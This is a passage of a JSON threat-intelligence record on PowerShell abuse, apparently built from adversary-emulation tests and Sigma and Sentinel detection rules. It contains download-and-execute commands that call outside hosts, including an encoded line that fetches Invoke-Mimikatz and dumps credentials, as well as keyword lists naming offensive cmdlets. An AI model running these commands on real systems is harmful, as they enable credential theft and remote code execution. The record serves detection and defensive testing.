'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "powershell.exe -version 2 -Command Write-Host $PSVersion\n", "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, {"windows": {"psh": {"command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"}}}, {"windows": {"psh,pwsh": {"command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"}}}, {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}, {"windows": {"psh": {"command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"}}}, {"windows": {"psh,pwsh": {"command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n", "payloads": ["Emulate-Administrator-Tasks.ps1"]}}}, {"windows": {"psh": {"command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"}}}, {"windows": {"psh": {"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"}}}, {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"}}}, "excel.exe", "cmd.exe", "powershell.exe", "excel.exe", "powershell.exe", "mshta.exe", "cmd.exe", "powershell.exe", "mshta.exe", "powershell.exe", "powerpoint.exe", "cmd.exe", "powershell.exe", "powerpoint.exe", "powershell.exe", "powershell.exe webClient.DownloadString(", "powershell.exe webClient.DownloadFile", "powershell.exe webClient.DownloadData", "winword.exe", "powershell.exe", "\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exehidden|-enc|-NonI", "powershell/lateral_movement/invoke_psremoting", "powershell/lateral_movement/invoke_psremoting", "powershell/management/spawn", "powershell/management/spawn", "python/management/multi/spawn", "python/management/multi/spawn"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_path contains \"powershell.exe\"or process_path contains \"powershell_ise.exe\"or process_path contains \"psexec.exe\")", "name": "PowerShell"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_command_line contains \"*.Download*\"or process_command_line contains \"*Net.WebClient*\")", "name": "PowerShell Downloads Process"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: T1086 non-interactive PowerShell\ndescription: By explorer.exe powershell.exe to as parent, non-interactive PowerShell activity detected.\nstatus: experimental\nauthor: 12306Bro\nreferences: None\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0NewProcessName: '* \\ powershell.exe'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ParentProcessName: '* \\ explorer.exe'\n\u00a0\u00a0\u00a0\u00a0condition: selection\nfalsepositives:\n\u00a0\u00a0\u00a0\u00a0- Unknown\nlevel: critical", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "APT29", "id": "033fe7d6-66d1-4240-ac6b-28908009c71f", "description": "This method detects a suspicious powershell command line combination as used by APT29 in a campaign against US think tanks", "references": ["https://cloudblogs.microsoft.com/microsoftsecure/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/"], "tags": ["attack.execution", "attack.g0016", "attack.t1086"], "author": "Florian Roth", "date": "2018/12/04", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "*-noni -ep bypass $*"}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "critical"}}, {"data_source": {"action": "global", "title": "Empire Monkey", "id": "10152a7b-b566-438f-a33c-390b607d1c8d", "description": "Detects EmpireMonkey APT reported Activity", "references": ["https://app.any.run/tasks/a4107649-8cb0-41af-ad75-113152d4d57b"], "tags": ["attack.t1086", "attack.execution"], "date": "2019/04/02", "author": "Markus Neis", "detection": {"condition": "1 of them"}, "falsepositives": ["Very Unlikely"], "level": "critical"}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_cutil": {"CommandLine": ["*/i:%APPDATA%\\logs.txt scrobj.dll"], "Image": ["*\\cutil.exe"]}, "selection_regsvr32": {"CommandLine": ["*/i:%APPDATA%\\logs.txt scrobj.dll"], "Description": ["Microsoft(C) Registerserver"]}}}}, {"data_source": {"title": "PowerShell Downgrade Attack", "id": "6331d09b-4785-4c13-980f-f96661356249", "status": "experimental", "description": "Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0", "references": ["http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/"], "tags": ["attack.defense_evasion", "attack.execution", "attack.t1086"], "author": "Florian Roth (rule), Lee Holmes (idea)", "logsource": {"product": "windows", "service": "powershell-classic"}, "detection": {"selection": {"EventID": 400, "EngineVersion": "2.*"}, "filter": {"HostVersion": "2.*"}, "condition": "selection and not filter"}, "falsepositives": ["Penetration Test", "Unknown"], "level": "medium"}}, {"data_source": {"title": "PowerShell called from an Executable Version Mismatch", "id": "c70e019b-1479-4b65-b0cc-cd0c6093a599", "status": "experimental", "description": "Detects PowerShell called from an executable by the version mismatch method", "references": ["https://adsecurity.org/?p=2921"], "tags": ["attack.defense_evasion", "attack.execution", "attack.t1086"], "author": "Sean Metcalf (source), Florian Roth (rule)", "logsource": {"product": "windows", "service": "powershell-classic"}, "detection": {"selection1": {"EventID": 400, "EngineVersion": ["2.*", "4.*", "5.*"], "HostVersion": "3.*"}, "condition": "selection1"}, "falsepositives": ["Penetration Tests", "Unknown"], "level": "high"}}, {"data_source": {"title": "Malicious PowerShell Commandlets", "id": "89819aa4-bbd6-46bc-88ec-c7f7fe30efa6", "status": "experimental", "description": "Detects Commandlet names from well-known PowerShell exploitation frameworks", "modified": "2019/01/22", "references": ["https://adsecurity.org/?p=2921"], "tags": ["attack.execution", "attack.t1086"], "author": "Sean Metcalf (source), Florian Roth (rule)", "logsource": {"product": "windows", "service": "powershell", "definition": "It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277"}, "detection": {"keywords": {"Message": ["*Invoke-DllInjection*", "*Invoke-Shellcode*", "*Invoke-WmiCommand*", "*Get-GPPPassword*", "*Get-Keystrokes*", "*Get-TimedScreenshot*", "*Get-VaultCredential*", "*Invoke-CredentialInjection*", "*Invoke-Mimikatz*", "*Invoke-NinjaCopy*", "*Invoke-TokenManipulation*", "*Out-Minidump*", "*VolumeShadowCopyTools*", "*Invoke-ReflectivePEInjection*", "*Invoke-UserHunter*", "*Find-GPOLocation*", "*Invoke-ACLScanner*", "*Invoke-DowngradeAccount*", "*Get-ServiceUnquoted*", "*Get-ServiceFilePermission*", "*Get-ServicePermission*", "*Invoke-ServiceAbuse*", "*Install-ServiceBinary*", "*Get-RegAutoLogon*", "*Get-VulnAutoRun*", "*Get-VulnSchTask*", "*Get-UnattendedInstallFile*", "*Get-ApplicationHost*", "*Get-RegAlwaysInstallElevated*", "*Get-Unconstrained*", "*Add-RegBackdoor*", "*Add-ScrnSaveBackdoor*", "*Gupt-Backdoor*", "*Invoke-ADSBackdoor*", "*Enabled-DuplicateToken*", "*Invoke-PsUaCme*", "*Remove-Update*", "*Check-VM*", "*Get-LSASecret*", "*Get-PassHashes*", "*Show-TargetScreen*", "*Port-Scan*", "*Invoke-PoshRatHttp*", "*Invoke-PowerShellTCP*", "*Invoke-PowerShellWMI*", "*Add-Exfiltration*", "*Add-Persistence*", "*Do-Exfiltration*", "*Start-CaptureServer*", "*Get-ChromeDump*", "*Get-ClipboardContents*", "*Get-FoxDump*", "*Get-IndexedItem*", "*Get-Screenshot*", "*Invoke-Inveigh*", "*Invoke-NetRipper*", "*Invoke-EgressCheck*", "*Invoke-PostExfil*", "*Invoke-PSInject*", "*Invoke-RunAs*", "*MailRaider*", "*New-HoneyHash*", "*Set-MacAttribute*", "*Invoke-DCSync*", "*Invoke-PowerDump*", "*Exploit-Jboss*", "*Invoke-ThunderStruck*", "*Invoke-VoiceTroll*", "*Set-Wallpaper*", "*Invoke-InveighRelay*", "*Invoke-PsExec*", "*Invoke-SSHCommand*", "*Get-SecurityPackages*", "*Install-SSP*", "*Invoke-BackdoorLNK*", "*PowerBreach*", "*Get-SiteListPassword*", "*Get-System*", "*Invoke-BypassUAC*", "*Invoke-Tater*", "*Invoke-WScriptBypassUAC*", "*PowerUp*", "*PowerView*", "*Get-RickAstley*", "*Find-Fruit*", "*HTTP-Login*", "*Find-TrustedDocuments*", "*Invoke-Paranoia*", "*Invoke-WinEnum*", "*Invoke-ARPScan*", "*Invoke-PortScan*", "*Invoke-ReverseDNSLookup*", "*Invoke-SMBScanner*", "*Invoke-Mimikittenz*"]}, "false_positives": ["Get-SystemDriveInfo"], "condition": "keywords and not false_positives"}, "falsepositives": ["Penetration testing"], "level": "high"}}, {"data_source": {"title": "Malicious PowerShell Keywords", "id": "f62176f3-8128-4faa-bf6c-83261322e5eb", "status": "experimental", "description": "Detects keywords from well-known PowerShell exploitation frameworks", "modified": "2019/01/22", "references": ["https://adsecurity.org/?p=2921"], "tags": ["attack.execution", "attack.t1086"], "author": "Sean Metcalf (source), Florian Roth (rule)", "logsource": {"product": "windows", "service": "powershell", "definition": "It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277"}, "detection": {"keywords": {"Message": ["*AdjustTokenPrivileges*", "*IMAGE_NT_OPTIONAL_HDR64_MAGIC*", "*Microsoft.Win32.UnsafeNativeMethods*", "*ReadProcessMemory.Invoke*", "*SE_PRIVILEGE_ENABLED*", "*LSA_UNICODE_STRING*", "*MiniDumpWriteDump*", "*PAGE_EXECUTE_READ*", "*SECURITY_DELEGATION*", "*TOKEN_ADJUST_PRIVILEGES*", "*TOKEN_ALL_ACCESS*", "*TOKEN_ASSIGN_PRIMARY*", "*TOKEN_DUPLICATE*", "*TOKEN_ELEVATION*", "*TOKEN_IMPERSONATE*", "*TOKEN_INFORMATION_CLASS*", "*TOKEN_PRIVILEGES*", "*TOKEN_QUERY*", "*Metasploit*", "*Mimikatz*"]}, "condition": "keywords"}, "falsepositives": ["Penetration tests"], "level": "high"}}, {"data_source": {"title": "PowerShell Credential Prompt", "id": "ca8b77a9-d499-4095-b793-5d5f330d450e", "status": "experimental", "description": "Detects PowerShell calling a credential prompt", "references": ["https://twitter.com/JohnLaTwC/status/850381440629981184", "https://t.co/ezOTGy1a1G"], "tags": ["attack.execution", "attack.credential_access", "attack.t1086"], "author": "John Lambert (idea), Florian Roth (rule)", "logsource": {"product": "windows", "service": "powershell", "definition": "Script block logging must be enabled"}, "detection": {"selection": {"EventID": 4104}, "keyword": {"Message": ["*PromptForCredential*"]}, "condition": "all of them"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "PowerShell PSAttack", "id": "b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5", "status": "experimental", "description": "Detects the use of PSAttack PowerShell hack tool", "references": ["https://adsecurity.org/?p=2921"], "tags": ["attack.execution", "attack.t1086"], "author": "Sean Metcalf (source), Florian Roth (rule)", "logsource": {"product": "windows", "service": "powershell", "definition": "It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277"}, "detection": {"selection": {"EventID": 4103}, "keyword": ["PS ATTACK!!!"], "condition": "all of them"}, "falsepositives": ["Pentesters"], "level": "high"}}, {"data_source": {"title": "PowerShell ShellCode", "id": "16b37b70-6fcf-4814-a092-c36bd3aafcbd", "status": "experimental", "description": "Detects Base64 encoded Shellcode", "references": ["https://twitter.com/cyb3rops/status/1063072865992523776"], "tags": ["attack.privilege_escalation", "attack.execution", "attack.t1055", "attack.t1086"], "author": "David Ledbetter (shellcode), Florian Roth (rule)", "date": "2018/11/17", "logsource": {"product": "windows", "service": "powershell", "description": "Script block logging must be enabled"}, "detection": {"selection": {"EventID": 4104}, "keyword1": ["*AAAAYInlM*"], "keyword2": ["*OiCAAAAYInlM*", "*OiJAAAAYInlM*"], "condition": "selection and keyword1 and keyword2"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "Suspicious PowerShell Download", "id": "65531a81-a694-4e31-ae04-f8ba5bc33759", "status": "experimental", "description": "Detects suspicious PowerShell download command", "tags": ["attack.execution", "attack.t1086"], "author": "Florian Roth", "logsource": {"product": "windows", "service": "powershell"}, "detection": {"keywords": {"Message": ["*System.Net.WebClient).DownloadString(*", "*system.net.webclient).downloadfile(*"]}, "condition": "keywords"}, "falsepositives": ["PowerShell scripts that download content from the Internet"], "level": "medium"}}, {"data_source": {"title": "Suspicious PowerShell Invocations - Generic", "id": "3d304fda-78aa-43ed-975c-d740798a49c1", "status": "experimental", "description": "Detects suspicious PowerShell invocation command parameters", "tags": ["attack.execution", "attack.t1086"], "author": "Florian Roth (rule)", "logsource": {"product": "windows", "service": "powershell"}, "detection": {"encoded": [" -enc ", " -EncodedCommand "], "hidden": [" -w hidden ", " -window hidden ", " - windowstyle hidden "], "noninteractive": [" -noni ", " -noninteractive "], "condition": "all of them"}, "falsepositives": ["Penetration tests", "Very special / sneaky PowerShell scripts"], "level": "high"}}, {"data_source": {"title": "Suspicious PowerShell Invocations - Specific", "id": "fce5f582-cc00-41e1-941a-c6fabf0fdb8c", "status": "experimental", "description": "Detects suspicious PowerShell invocation command parameters", "tags": ["attack.execution", "attack.t1086"], "author": "Florian Roth (rule)", "logsource": {"product": "windows", "service": "powershell"}, "detection": {"keywords": {"Message": ["* -nop -w hidden -c * [Convert]::FromBase64String*", "* -w hidden -noni -nop -c \"iex(New-Object*", "* -w hidden -ep bypass -Enc*", "*powershell.exe reg add HKCU\\software\\microsoft\\windows\\currentversion\\run*", "*bypass -noprofile -windowstyle hidden (new-object system.net.webclient).download*", "*iex(New-Object Net.WebClient).Download*"]}, "condition": "keywords"}, "falsepositives": ["Penetration tests"], "level": "high"}}, {"data_source": {"title": "Suspicious PowerShell Keywords", "id": "1f49f2ab-26bc-48b3-96cc-dcffbc93eadf", "status": "experimental", "description": "Detects keywords that could indicate the use of some PowerShell exploitation framework", "date": "2019/02/11", "author": "Florian Roth", "references": ["https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462"], "tags": ["attack.execution", "attack.t1086"], "logsource": {"product": "windows", "service": "powershell", "definition": "It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277"}, "detection": {"keywords": {"Message": ["*[System.Reflection.Assembly]::Load*"]}, "condition": "keywords"}, "falsepositives": ["Penetration tests"], "level": "high"}}, {"data_source": {"title": "Malicious PowerShell Commandlet Names", "id": "f331aa1f-8c53-4fc3-b083-cc159bc971cb", "status": "experimental", "description": "Detects the creation of known powershell scripts for exploitation", "references": ["https://raw.githubusercontent.com/Neo23x0/sigma/f35c50049fa896dff91ff545cb199319172701e8/rules/windows/powershell/powershell_malicious_commandlets.yml"], "tags": ["attack.execution", "attack.t1086"], "author": "Markus Neis", "date": "2018/04/07", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 11, "TargetFilename": ["*\\Invoke-DllInjection.ps1", "*\\Invoke-WmiCommand.ps1", "*\\Get-GPPPassword.ps1", "*\\Get-Keystrokes.ps1", "*\\Get-VaultCredential.ps1", "*\\Invoke-CredentialInjection.ps1", "*\\Invoke-Mimikatz.ps1", "*\\Invoke-NinjaCopy.ps1", "*\\Invoke-TokenManipulation.ps1", "*\\Out-Minidump.ps1", "*\\VolumeShadowCopyTools.ps1", "*\\Invoke-ReflectivePEInjection.ps1", "*\\Get-TimedScreenshot.ps1", "*\\Invoke-UserHunter.ps1", "*\\Find-GPOLocation.ps1", "*\\Invoke-ACLScanner.ps1", "*\\Invoke-DowngradeAccount.ps1", "*\\Get-ServiceUnquoted.ps1", "*\\Get-ServiceFilePermission.ps1", "*\\Get-ServicePermission.ps1", "*\\Invoke-ServiceAbuse.ps1", "*\\Install-ServiceBinary.ps1", "*\\Get-RegAutoLogon.ps1", "*\\Get-VulnAutoRun.ps1", "*\\Get-VulnSchTask.ps1", "*\\Get-UnattendedInstallFile.ps1", "*\\Get-WebConfig.ps1", "*\\Get-ApplicationHost.ps1", "*\\Get-RegAlwaysInstallElevated.ps1", "*\\Get-Unconstrained.ps1", "*\\Add-RegBackdoor.ps1", "*\\Add-ScrnSaveBackdoor.ps1", "*\\Gupt-Backdoor.ps1", "*\\Invoke-ADSBackdoor.ps1", "*\\Enabled-DuplicateToken.ps1", "*\\Invoke-PsUaCme.ps1", "*\\Remove-Update.ps1", "*\\Check-VM.ps1", "*\\Get-LSASecret.ps1", "*\\Get-PassHashes.ps1", "*\\Show-TargetScreen.ps1", "*\\Port-Scan.ps1", "*\\Invoke-PoshRatHttp.ps1", "*\\Invoke-PowerShellTCP.ps1", "*\\Invoke-PowerShellWMI.ps1", "*\\Add-Exfiltration.ps1", "*\\Add-Persistence.ps1", "*\\Do-Exfiltration.ps1", "*\\Start-CaptureServer.ps1", "*\\Invoke-ShellCode.ps1", "*\\Get-ChromeDump.ps1", "*\\Get-ClipboardContents.ps1", "*\\Get-FoxDump.ps1", "*\\Get-IndexedItem.ps1", "*\\Get-Screenshot.ps1", "*\\Invoke-Inveigh.ps1", "*\\Invoke-NetRipper.ps1", "*\\Invoke-EgressCheck.ps1", "*\\Invoke-PostExfil.ps1", "*\\Invoke-PSInject.ps1", "*\\Invoke-RunAs.ps1", "*\\MailRaider.ps1", "*\\New-HoneyHash.ps1", "*\\Set-MacAttribute.ps1", "*\\Invoke-DCSync.ps1", "*\\Invoke-PowerDump.ps1", "*\\Exploit-Jboss.ps1", "*\\Invoke-ThunderStruck.ps1", "*\\Invoke-VoiceTroll.ps1", "*\\Set-Wallpaper.ps1", "*\\Invoke-InveighRelay.ps1", "*\\Invoke-PsExec.ps1", "*\\Invoke-SSHCommand.ps1", "*\\Get-SecurityPackages.ps1", "*\\Install-SSP.ps1", "*\\Invoke-BackdoorLNK.ps1", "*\\PowerBreach.ps1", "*\\Get-SiteListPassword.ps1", "*\\Get-System.ps1", "*\\Invoke-BypassUAC.ps1", "*\\Invoke-Tater.ps1", "*\\Invoke-WScriptBypassUAC.ps1", "*\\PowerUp.ps1", "*\\PowerView.ps1", "*\\Get-RickAstley.ps1", "*\\Find-Fruit.ps1", "*\\HTTP-Login.ps1", "*\\Find-TrustedDocuments.ps1", "*\\Invoke-Paranoia.ps1", "*\\Invoke-WinEnum.ps1", "*\\Invoke-ARPScan.ps1", "*\\Invoke-PortScan.ps1", "*\\Invoke-ReverseDNSLookup.ps1", "*\\Invoke-SMBScanner.ps1", "*\\Invoke-Mimikittenz.ps1"]}, "condition": "selection"}, "falsepositives": ["Penetration Tests"], "level": "high"}}, {"data_source": {"title": "PowerShell Network Connections", "id": "1f21ec3f-810d-4b0e-8045-322202e22b4b", "status": "experimental", "description": "Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company's ip range')", "author": "Florian Roth", "references": ["https://www.youtube.com/watch?v=DLtJTxMWZ2o"], "tags": ["attack.execution", "attack.t1086"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 3, "Image": "*\\powershell.exe", "Initiated": "true"}, "filter": {"DestinationIp": ["10.*", "192.168.*", "172.16.*", "172.17.*", "172.18.*", "172.19.*", "172.20.*", "172.21.*", "172.22.*", "172.23.*", "172.24.*", "172.25.*", "172.26.*", "172.27.*", "172.28.*", "172.29.*", "172.30.*", "172.31.*", "127.0.0.1"], "DestinationIsIpv6": "false", "User": "NT AUTHORITY\\SYSTEM"}, "condition": "selection and not filter"}, "falsepositives": ["Administrative scripts"], "level": "low"}}, {"data_source": {"title": "PowerShell Rundll32 Remote Thread Creation", "id": "99b97608-3e21-4bfe-8217-2a127c396a0e", "status": "experimental", "description": "Detects PowerShell remote thread creation in Rundll32.exe", "author": "Florian Roth", "references": ["https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html"], "date": "2018/06/25", "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 8, "SourceImage": "*\\powershell.exe", "TargetImage": "*\\rundll32.exe"}, "condition": "selection"}, "tags": ["attack.defense_evasion", "attack.execution", "attack.t1085", "attack.t1086"], "falsepositives": ["Unkown"], "level": "high"}}, {"data_source": {"title": "Suspicious Scripting in a WMI Consumer", "id": "fe21810c-2a8c-478f-8dd3-5a287fb2a0e0", "status": "experimental", "description": "Detects suspicious scripting in WMI Event Consumers", "author": "Florian Roth", "references": ["https://in.security/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/", "https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar#L19"], "date": "2019/04/15", "tags": ["attack.t1086", "attack.execution"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 20, "Destination": ["*new-object system.net.webclient).downloadstring(*", "*new-object system.net.webclient).downloadfile(*", "*new-object net.webclient).downloadstring(*", "*new-object net.webclient).downloadfile(*", "* iex(*", "*WScript.shell*", "* -nop *", "* -noprofile *", "* -decode *", "* -enc *"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Administrative scripts"], "level": "high"}}, {"data_source": {"title": "Powershell AMSI Bypass via .NET Reflection", "id": "30edb182-aa75-42c0-b0a9-e998bb29067c", "status": "experimental", "description": "Detects Request to amsiInitFailed that can be used to disable AMSI Scanning", "references": ["https://twitter.com/mattifestation/status/735261176745988096", "https://www.hybrid-analysis.com/sample/0ced17419e01663a0cd836c9c2eb925e3031ffb5b18ccf35f4dea5d586d0203e?environmentId=120"], "tags": ["attack.execution", "attack.defense_evasion", "attack.t1086"], "author": "Markus Neis", "date": "2018/08/17", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": ["*System.Management.Automation.AmsiUtils*"]}, "selection2": {"CommandLine": ["*amsiInitFailed*"]}, "condition": "selection1 and selection2", "falsepositives": ["Potential Admin Activity"]}, "level": "high"}}, {"data_source": {"title": "Detection of PowerShell Execution via DLL", "id": "6812a10b-60ea-420c-832f-dfcc33b646ba", "status": "experimental", "description": "Detects PowerShell Strings applied to rundllas seen in PowerShdll.dll", "references": ["https://github.com/p3nt4/PowerShdll/blob/master/README.md"], "tags": ["attack.execution", "attack.t1086", "car.2014-04-003"], "author": "Markus Neis", "date": "2018/08/25", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"Image": ["*\\rundll32.exe"]}, "selection2": {"Description": ["*Windows-Hostprozess (Rundll32)*"]}, "selection3": {"CommandLine": ["*Default.GetString*", "*FromBase64String*"]}, "condition": "(selection1 or selection2) and selection3"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "PowerShell Download from URL", "id": "3b6ab547-8ec2-4991-b9d2-2b06702a48d7", "status": "experimental", "description": "Detects a Powershell process that contains download commands in its command line string", "author": "Florian Roth", "tags": ["attack.t1086", "attack.execution"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\powershell.exe", "CommandLine": ["*new-object system.net.webclient).downloadstring(*", "*new-object system.net.webclient).downloadfile(*", "*new-object net.webclient).downloadstring(*", "*new-object net.webclient).downloadfile(*"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["unknown"], "level": "medium"}}, {"data_source": {"title": "Suspicious PowerShell Parameter Substring", "id": "36210e0d-5b19-485d-a087-c096088885f0", "status": "experimental", "description": "Detects suspicious PowerShell invocation with a parameter substring", "references": ["http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier"], "tags": ["attack.execution", "attack.t1086"], "author": "Florian Roth (rule), Daniel Bohannon (idea), Roberto Rodriguez (Fix)", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": ["*\\Powershell.exe"], "CommandLine": [" -windowstyle h ", " -windowstyl h", " -windowsty h", " -windowst h", " -windows h", " -windo h", " -wind h", " -win h", " -wi h", " -win h ", " -win hi ", " -win hid ", " -win hidd ", " -win hidde ", " -NoPr ", " -NoPro ", " -NoProf ", " -NoProfi ", " -NoProfil ", " -nonin ", " -nonint ", " -noninte ", " -noninter ", " -nonintera ", " -noninterac ", " -noninteract ", " -noninteracti ", " -noninteractiv ", " -ec ", " -encodedComman ", " -encodedComma ", " -encodedComm ", " -encodedCom ", " -encodedCo ", " -encodedC ", " -encoded ", " -encode ", " -encod ", " -enco ", " -en "]}, "condition": "selection"}, "falsepositives": ["Penetration tests"], "level": "high"}}, {"data_source": {"title": "Suspicious XOR Encoded PowerShell Command Line", "id": "bb780e0c-16cf-4383-8383-1e5471db6cf9", "description": "Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands.", "status": "experimental", "author": "Sami Ruohonen", "date": "2018/09/05", "tags": ["attack.execution", "attack.t1086"], "detection": {"selection": {"CommandLine": ["* -bxor*"]}, "condition": "selection"}, "falsepositives": ["unknown"], "level": "medium", "logsource": {"category": "process_creation", "product": "windows"}}}, {"data_source": {"title": "Default PowerSploit and Empire Schtasks Persistence", "id": "56c217c3-2de2-479b-990f-5c109ba8458f", "status": "experimental", "description": "Detects the creation of a schtask via PowerSploit or Empire Default Configuration.", "references": ["https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1", "https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py", "https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py"], "author": "Markus Neis, @Karneades", "date": "2018/03/06", "logsource": {"product": "windows", "category": "process_creation"}, "detection": {"selection": {"ParentImage": ["*\\powershell.exe"], "CommandLine": ["*schtasks*/Create*/SC *ONLOGON*/TN *Updater*/TR *powershell*", "*schtasks*/Create*/SC *DAILY*/TN *Updater*/TR *powershell*", "*schtasks*/Create*/SC *ONIDLE*/TN *Updater*/TR *powershell*", "*schtasks*/Create*/SC *Updater*/TN *Updater*/TR *powershell*"]}, "condition": "selection"}, "tags": ["attack.execution", "attack.persistence", "attack.privilege_escalation", "attack.t1053", "attack.t1086", "attack.s0111", "attack.g0022", "attack.g0060", "car.2013-08-001"], "falsepositives": ["False positives are possible, depends on organisation and processes"], "level": "high"}}, {"data_source": {"title": "Empire PowerShell Launch Parameters", "id": "79f4ede3-402e-41c8-bc3e-ebbf5f162581", "description": "Detects suspicious powershell command line parameters used in Empire", "status": "experimental", "references": ["https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165", 